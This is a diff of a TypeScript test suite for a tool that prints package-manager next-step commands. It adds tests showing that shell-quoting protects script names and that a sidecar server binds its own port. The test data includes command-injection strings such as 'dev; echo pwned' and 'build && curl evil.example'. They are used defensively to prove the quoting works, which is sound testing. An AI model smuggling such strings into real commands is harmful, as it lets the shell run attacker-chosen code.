@@ -11,8 +11,9 @@
  *     never matched against a pattern. A plausible-looking transcript has hidden a broken
  *     command before; `npm exec` and `yarn exec` both eat `--host 127.0.0.1` without a `--`.
  */
-import { execFileSync } from "node:child_process";
+import { execFileSync, spawn, type ChildProcess } from "node:child_process";
 import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { createServer, get as httpGet } from "node:http";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { afterAll, describe, expect, it } from "vitest";
@@ -20,11 +21,20 @@ import {
   CANONICAL_NEXT_STEPS,
   PACKAGE_MANAGER_COMMAND_FORMS,
   assertCanonicalNextSteps,
-  compareToCanonicalNextSteps,
   renderNextSteps,
   type NextStepsPackageManager,
   type NextStepsTopology,
 } from "../src/next-steps";
+
+/** The comparison has one surface — it throws. `matches` here is only for readability below. */
+function matchesCanonical(embedded: string): boolean {
+  try {
+    assertCanonicalNextSteps(embedded);
+    return true;
+  } catch {
+    return false;
+  }
+}
 
 const MANAGERS: NextStepsPackageManager[] = ["npm", "pnpm", "yarn"];
 
@@ -112,6 +122,56 @@ describe("renderNextSteps", () => {
     }
   });
 
+  it("quotes a dev script name the shell would otherwise take apart", () => {
+    // `devScript` is read out of somebody else's package.json and lands in a command position.
+    // Unquoted, a name with a space addresses the wrong script and a name with a metacharacter is
+    // interpreted by the shell the developer pastes the line into.
+    expect(renderNextSteps({ ...MOUNTED, packageManager: "pnpm", devScript: "my script" })).toContain(
+      "pnpm run 'my script'",
+    );
+    expect(
+      renderNextSteps({ ...MOUNTED, packageManager: "pnpm", devScript: "dev; echo pwned" }),
+    ).toContain("pnpm run 'dev; echo pwned'");
+    expect(
+      renderNextSteps({ ...MOUNTED, packageManager: "npm", devScript: "build && curl evil.example" }),
+    ).toContain("npm run 'build && curl evil.example'");
+    // A literal quote survives single-quoting the only way POSIX allows.
+    expect(renderNextSteps({ ...MOUNTED, packageManager: "pnpm", devScript: "it's" })).toContain(
+      `pnpm run 'it'\\''s'`,
+    );
+  });
+
+  it("leaves an ordinary script name unquoted", () => {
+    // The common case has to stay readable, or the quoting becomes noise a developer edits out.
+    expect(renderNextSteps({ ...MOUNTED, packageManager: "pnpm", devScript: "dev" })).toContain(
+      "pnpm run dev\n",
+    );
+    expect(renderNextSteps({ ...MOUNTED, packageManager: "pnpm", devScript: "dev:web" })).toContain(
+      "pnpm run dev:web\n",
+    );
+    expect(renderNextSteps({ ...MOUNTED, packageManager: "npm", devScript: "start-server" })).toContain(
+      "npm run start-server\n",
+    );
+  });
+
+  it("uses the explicit run form for every manager, never the shortcut", () => {
+    // `pnpm <name>` and `yarn <name>` lose to the manager's own builtins, and the name here is
+    // whatever the project happened to call its script.
+    for (const manager of MANAGERS) {
+      expect(PACKAGE_MANAGER_COMMAND_FORMS[manager].run).toBe(`${manager} run`);
+    }
+  });
+
+  it("names a port on the sidecar server", () => {
+    // `fsdev serve` falls back to $PORT, then 3000 — and a second-process host is by definition
+    // a project already running a server, most often on 3000.
+    const second = renderNextSteps({ topology: "second-process", packageManager: "pnpm" });
+    expect(second).toContain("fsdev serve --host 127.0.0.1 --port 4201");
+    expect(second).toContain("http://127.0.0.1:4201");
+    // The word 3000 appears in the sentence explaining the flag; no URL or command may name it.
+    expect(second).not.toMatch(/:3000/);
+  });
+
   it("never prints --allow-unauthenticated", () => {
     for (const topology of ["mounted-route", "second-process"] as NextStepsTopology[]) {
       expect(renderNextSteps({ ...MOUNTED, topology, packageManager: "npm" })).not.toContain(
@@ -164,7 +224,7 @@ describe("the block says the same thing under every package manager", () => {
     expect(npm).not.toBe(pnpm);
     expect(npm).toContain("npm run serve");
     expect(npm).toContain("npm exec -- fsdev dev");
-    expect(pnpm).toContain("pnpm serve");
+    expect(pnpm).toContain("pnpm run serve");
     expect(pnpm).toContain("pnpm exec fsdev dev");
   });
 });
@@ -206,16 +266,16 @@ describe("the caveats describe today's behaviour and promise nothing about produ
 // 4. The comparison
 // ---------------------------------------------------------------------------
 
-describe("compareToCanonicalNextSteps", () => {
+describe("assertCanonicalNextSteps", () => {
   it("accepts a verbatim copy", () => {
-    expect(compareToCanonicalNextSteps(CANONICAL_NEXT_STEPS).matches).toBe(true);
+    expect(() => assertCanonicalNextSteps(CANONICAL_NEXT_STEPS)).not.toThrow();
   });
 
   it("accepts a copy that only differs in line endings, trailing space and uniform indent", () => {
     const embedded = CANONICAL_NEXT_STEPS.split("\n")
       .map((line) => (line === "" ? line : `    ${line}   `))
       .join("\r\n");
-    expect(compareToCanonicalNextSteps(`\n\n${embedded}\n\n`).matches).toBe(true);
+    expect(matchesCanonical(`\n\n${embedded}\n\n`)).toBe(true);
   });
 
   it("rejects a copy with the branch that shipper never renders trimmed out", () => {
@@ -226,9 +286,7 @@ describe("compareToCanonicalNextSteps", () => {
       "",
     );
     expect(trimmed).not.toBe(CANONICAL_NEXT_STEPS);
-    const result = compareToCanonicalNextSteps(trimmed);
-    expect(result.matches).toBe(false);
-    expect(result.reason).toMatch(/line \d+ differs/);
+    expect(() => assertCanonicalNextSteps(trimmed)).toThrow(/line \d+ differs/);
   });
 
   it("rejects a caveat someone softened in their own copy", () => {
@@ -236,18 +294,15 @@ describe("compareToCanonicalNextSteps", () => {
       "A shared secret is not authentication",
       "A shared secret is fine for now",
     );
-    expect(compareToCanonicalNextSteps(softened).matches).toBe(false);
+    expect(matchesCanonical(softened)).toBe(false);
   });
 
   it("rejects a rendered block — the comparison is over the source, placeholders included", () => {
-    expect(
-      compareToCanonicalNextSteps(renderNextSteps({ ...MOUNTED, packageManager: "pnpm" })).matches,
-    ).toBe(false);
+    expect(matchesCanonical(renderNextSteps({ ...MOUNTED, packageManager: "pnpm" }))).toBe(false);
   });
 
-  it("names the copy in the assertion form's failure", () => {
+  it("names the copy in the failure message", () => {
     expect(() => assertCanonicalNextSteps("Next steps\n", "SKILL.md")).toThrow(/^SKILL\.md has drifted/);
-    expect(() => assertCanonicalNextSteps(CANONICAL_NEXT_STEPS)).not.toThrow();
   });
 });
 
@@ -276,7 +331,16 @@ function projectFor(manager: NextStepsPackageManager): string {
         name: "next-steps-probe",
         version: "1.0.0",
         private: true,
-        scripts: { serve: "node ./echo-argv.js --from-script" },
+        scripts: {
+          serve: "node ./echo-argv.js --from-script",
+          // Two script names a shell would take apart if the block printed them bare.
+          "my script": "node ./echo-argv.js --from-space-script",
+          "dev; echo pwned": "node ./echo-argv.js --from-metachar-script",
+          // Two names that collide with a package manager's own builtins. Under the shortcut
+          // form (`pnpm list`, `yarn config`) the manager runs itself and the script never does.
+          list: "node ./echo-argv.js --from-list-script",
+          config: "node ./echo-argv.js --from-config-script",
+        },
       },
       null,
       2,
@@ -312,14 +376,24 @@ afterAll(() => {
   for (const root of projectRoots.values()) rmSync(root, { recursive: true, force: true });
 });
 
-/** Is this manager on the machine running the tests? */
+/**
+ * Can the probe project above actually be driven by this manager here?
+ *
+ * Not "is the manager installed". The fixture is a hand-built `node_modules/.bin` with no
+ * lockfile, which Yarn Berry rejects before it ever reaches our binary — so an installed-only
+ * gate would let Berry in and produce a red that is about the fixture, not about the block.
+ * Yarn is therefore gated on major 1, the line this fixture is valid for. npm and pnpm run a
+ * lockfile-free directory fine.
+ */
 function managerAvailable(manager: NextStepsPackageManager): boolean {
+  let version: string;
   try {
-    execFileSync(manager, ["--version"], { stdio: "ignore" });
-    return true;
+    version = execFileSync(manager, ["--version"], { encoding: "utf-8", stdio: ["ignore", "pipe", "ignore"] }).trim();
   } catch {
     return false;
   }
+  if (manager === "yarn") return version.startsWith("1.");
+  return version.length > 0;
 }
 
 /** Run one printed command line in the probe project and return the argv the binary saw. */
@@ -334,6 +408,43 @@ function runPrintedCommand(manager: NextStepsPackageManager, line: string): stri
     throw new Error(`Command \`${line}\` produced no argv line. Output:\n${output}`);
   }
   return JSON.parse(match[1]!) as string[];
+}
+
+/** What the stand-in for the developer's own server answers with, so the probe can tell them apart. */
+const HOST_MARKER = "the-developers-own-server";
+
+/** One GET, returning the body or `null` when nothing answered. */
+async function fetchBody(port: number, path: string): Promise<string | null> {
+  return new Promise((done) => {
+    const request = httpGet({ host: "127.0.0.1", port, path, timeout: 2000 }, (response) => {
+      let body = "";
+      response.on("data", (chunk) => (body += String(chunk)));
+      response.on("end", () => done(body));
+    });
+    request.once("error", () => done(null));
+    request.once("timeout", () => {
+      request.destroy();
+      done(null);
+    });
+  });
+}
+
+/**
+ * Poll until the **sidecar** answers on `port` — not until anything does.
+ *
+ * Waiting on a TCP connect is the check that passes for the wrong reason here: the whole scenario
+ * has the developer's own server already listening, so a probe that only asks "is something on
+ * this port" reports success on *their* process when the sidecar has collided and died.
+ */
+async function waitForSidecar(port: number, child: ChildProcess, timeoutMs: number): Promise<boolean> {
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    if (child.exitCode !== null) return false;
+    const body = await fetchBody(port, "/api/flows");
+    if (body !== null && !body.includes(HOST_MARKER)) return true;
+    await new Promise((sleep) => setTimeout(sleep, 250));
+  }
+  return false;
 }
 
 /** Every command line in a rendered block: the indented lines that start with a manager token. */
@@ -394,8 +505,112 @@ describe("the printed commands actually run", () => {
         },
         60_000,
       );
+
+      it.runIf(managerAvailable(manager))(
+        "runs a dev script whose name a shell would otherwise take apart",
+        () => {
+          // Executed, not pattern-matched: unquoted, `pnpm my script` looks up a script called
+          // `my` and `pnpm dev; echo pwned` runs two commands, one of them the developer's shell
+          // interpreting text out of their own package.json.
+          for (const [devScript, marker] of [
+            ["my script", "--from-space-script"],
+            ["dev; echo pwned", "--from-metachar-script"],
+          ] as const) {
+            const rendered = renderNextSteps({ ...MOUNTED, packageManager: manager, devScript });
+            const { run } = PACKAGE_MANAGER_COMMAND_FORMS[manager];
+            const line = rendered
+              .split("\n")
+              .map((l) => l.trim())
+              .find((l) => l.startsWith(`${run} `));
+            expect(line, "the block did not print the dev script line").toBeDefined();
+            expect(runPrintedCommand(manager, line!), `\`${line}\` did not reach the script`).toEqual([
+              marker,
+            ]);
+          }
+        },
+        60_000,
+      );
+
+      it.runIf(managerAvailable(manager))(
+        "runs a dev script whose name collides with one of the manager's own builtins",
+        () => {
+          // `pnpm list` prints a dependency tree and `yarn config` errors on a subcommand; in
+          // both cases the developer's script never runs and nothing says so. Executed rather
+          // than reasoned about, because which names are builtins is the manager's business.
+          for (const [devScript, marker] of [
+            ["list", "--from-list-script"],
+            ["config", "--from-config-script"],
+          ] as const) {
+            const rendered = renderNextSteps({ ...MOUNTED, packageManager: manager, devScript });
+            const { run } = PACKAGE_MANAGER_COMMAND_FORMS[manager];
+            const line = rendered
+              .split("\n")
+              .map((l) => l.trim())
+              .find((l) => l.startsWith(`${run} `));
+            expect(line).toBeDefined();
+            expect(
+              runPrintedCommand(manager, line!),
+              `\`${line}\` ran the manager's builtin instead of the project's script`,
+            ).toEqual([marker]);
+          }
+        },
+        60_000,
+      );
     });
   }
+
+  it(
+    "starts beside a host already holding fsdev serve's default port",
+    async () => {
+      // The claim: a second-process host is a project already running a server, and `fsdev serve`
+      // falls back to $PORT then 3000 — so the printed command has to name a port of its own or
+      // it reliably fails to bind. Proved with two real processes, not by reading the string.
+      const host = createServer((_req, res) => res.end(HOST_MARKER));
+      await new Promise<void>((resolveListen, rejectListen) => {
+        host.once("error", rejectListen);
+        host.listen(3000, "127.0.0.1", resolveListen);
+      }).catch((err) => {
+        throw new Error(
+          `Could not occupy port 3000 to stand in for the developer's own server: ${String(err)}`,
+        );
+      });
+
+      // Take the sidecar's argv out of the block itself, so the test exercises what is printed.
+      const second = renderNextSteps({ topology: "second-process", packageManager: "pnpm" });
+      const serveLine = second
+        .split("\n")
+        .map((line) => line.trim())
+        .find((line) => line.includes("fsdev serve"));
+      expect(serveLine, "the block did not print a serve command").toBeDefined();
+      const argv = serveLine!.slice(serveLine!.indexOf("fsdev serve") + "fsdev ".length).split(" ");
+
+      const sidecar = spawn(
+        resolve(import.meta.dirname, "../node_modules/.bin/tsx"),
+        [resolve(import.meta.dirname, "../src/bin.ts"), ...argv],
+        { cwd: resolve(import.meta.dirname, "fixtures-config", "valid"), stdio: ["ignore", "pipe", "pipe"] },
+      );
+      let sidecarOutput = "";
+      sidecar.stdout.on("data", (chunk) => (sidecarOutput += String(chunk)));
+      sidecar.stderr.on("data", (chunk) => (sidecarOutput += String(chunk)));
+
+      try {
+        // Where the command names no port, wait on the one `fsdev serve` actually falls back to.
+        // Otherwise a block that dropped `--port` would fail this check with a NaN rather than
+        // with the port collision the check exists to catch.
+        const named = argv.indexOf("--port");
+        const port = named === -1 ? 3000 : Number(argv[named + 1]);
+        const up = await waitForSidecar(port, sidecar, 90_000);
+        expect(up, `the sidecar never answered on ${port}. Output:\n${sidecarOutput}`).toBe(true);
+        // Both alive, and they are two processes: the host still answers its own marker.
+        expect(await fetchBody(3000, "/")).toBe(HOST_MARKER);
+        expect(sidecar.exitCode).toBeNull();
+      } finally {
+        sidecar.kill("SIGKILL");
+        await new Promise<void>((done) => host.close(() => done()));
+      }
+    },
+    120_000,
+  );
 
   it("would go red without the option separator, for the managers that need one", () => {
     // The demonstration that the check above can fail. Emitting the loopback flag without the
